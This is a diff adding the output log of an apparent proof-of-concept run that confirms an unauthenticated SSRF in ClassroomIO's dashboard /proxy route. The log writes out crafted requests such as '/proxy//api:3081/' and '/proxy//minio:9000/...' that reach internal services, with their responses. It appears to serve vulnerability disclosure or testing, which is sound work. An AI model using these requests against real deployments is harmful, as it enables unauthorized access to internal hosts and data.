@@ -1,0 +1,16 @@
+========================================================================
+VULN-003: Unauthenticated full-read SSRF via dashboard /proxy//host
+target: API=http://localhost:21527  dashboard=http://localhost:21526
+========================================================================
+[INFO] exercising apps/dashboard/src/hooks.server.ts:112-114 → proxy-api-request.ts:129/155
+[INFO] the /proxy/* forwarding branch runs BEFORE any auth — no cookie is sent
+[STEP] baseline: GET http://localhost:21527/ directly (published API)
+[INFO]   direct API body: {"message":"\"Welcome to Classroomio.com API - docs are at http://localhost:21527/docs\""}
+[STEP] SSRF: GET http://localhost:21526/proxy//api:3081/  (no cookie) → server should fetch internal Hono API welcome (api:3081)
+[INFO]   proxied response: HTTP 200  body[:90]='{"message":"\\"Welcome to Classroomio.com API - docs are at http://localhost:21527/docs\\""}'
+[PROOF] dashboard returned the INTERNAL API's welcome JSON verbatim — the server fetched http://api:3081/ on our behalf (authority overridden)
+[STEP] SSRF: GET http://localhost:21526/proxy//minio:9000/minio/health/live  (no cookie) → server should fetch internal MinIO health (minio:9000)
+[INFO]   proxied response: HTTP 200  body[:90]=''
+[PROOF] dashboard reached MinIO's internal health endpoint (only resolvable inside the compose network) → server-side fetch of an internal host
+==> VULN-003: CONFIRMED — unauth SSRF: dashboard proxied to 2 internal host(s): internal Hono API welcome (api:3081), internal MinIO health (minio:9000)
+[OK] exploit confirmed — arbitrary internal/metadata hosts are reachable, no auth
